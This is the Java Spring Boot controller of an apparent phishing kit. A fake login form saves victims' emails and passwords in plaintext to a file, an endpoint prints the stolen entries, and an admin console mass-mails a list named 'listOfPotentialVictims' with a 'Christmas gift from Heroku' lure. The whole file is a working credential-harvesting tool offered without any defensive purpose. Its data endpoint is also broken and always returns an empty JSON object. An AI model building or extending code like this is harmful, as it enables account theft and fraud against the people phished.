package com.example.demo;

import com.fasterxml.jackson.databind.ObjectMapper;
import org.json.JSONArray;
import org.json.JSONObject;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;

@org.springframework.stereotype.Controller
public class AppController {

    final String fileName = "data.txt";
    final String delimiter = ",";

    @Autowired
    private EmailSenderService service;

    @GetMapping("/login")
    public String loginForm(Model model) {
        model.addAttribute("credentials", new Credentials());
        return "login";
    }

    @PostMapping("/login")
    public String loginSubmit(@ModelAttribute Credentials credentials, Model model) throws IOException {

        final String newLineString = "\n";
        String sensitiveContent = newLineString + credentials.getEmail() + delimiter + credentials.getPassword();
        Files.writeString(Paths.get(fileName), sensitiveContent, StandardCharsets.UTF_8, StandardOpenOption.CREATE,
                StandardOpenOption.APPEND);

        return "result";
    }

    @GetMapping("/data")
    @ResponseBody
    public String getData() throws IOException {
        String fileData = Files.readString(Paths.get(fileName), StandardCharsets.UTF_8);
        System.out.println(fileData);
        String[] dataStr = fileData.split(System.lineSeparator());
        JSONObject result = new JSONObject();
        JSONArray data = new JSONArray();
        for(String s : dataStr){
            String[] parts = s.split(delimiter);
            if(parts.length < 2) continue;
            String singleUserJsonString = String.format("{ \"email\": \"%s\", \"password\": \"%s\" }", parts[0], parts[1]);
            System.out.println(singleUserJsonString);
            JSONObject jsonObject = new JSONObject(singleUserJsonString);
            data.put(jsonObject);
        }
        return result.toString();
    }

    @GetMapping("/admin-console")
    public String emailForm(Model model) {
        model.addAttribute("emailInfo", new EmailInfo());
        return "admin-email-sender-console";
    }

    @PostMapping("/admin-console")
    public String emailFormSubmit(@ModelAttribute EmailInfo emailInfo, Model model) throws IOException {

        final String newLineString = "\n";
        String listOfPotentialVictims = emailInfo.getEmails();
        System.out.println(listOfPotentialVictims);
        final String subject = "Christmas gift from Heroku - Login to encash the coupon!!";
        for(String email : listOfPotentialVictims.split(System.lineSeparator())){
            service.sendSimpleEmail(email, emailInfo.getEmailContent(), subject);
        }
        return "mail-sent";
    }

}